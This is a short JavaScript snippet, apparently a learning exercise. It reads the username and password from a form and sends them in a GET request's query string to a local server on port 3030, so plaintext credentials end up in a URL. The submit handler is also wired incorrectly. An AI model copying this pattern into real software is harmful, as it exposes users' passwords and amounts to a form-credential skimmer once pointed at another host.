/*<form action="/" method="post">
    <input type="text" name="usuario" value="victor">
    <input type="password" name="senha" value="123">
</form>
*/


function enviar(){
    var usuario = document.forms[0].elements[0].value;
    var senha = document.forms[0].elements[1].value;
    fetch("http://localhost:3030/?usuario="+ usuario + "&senha=" + senha,{
        method: "GET",
        mode: "no-cors"
    })
}

document.forms[0].onsubmit = enviar();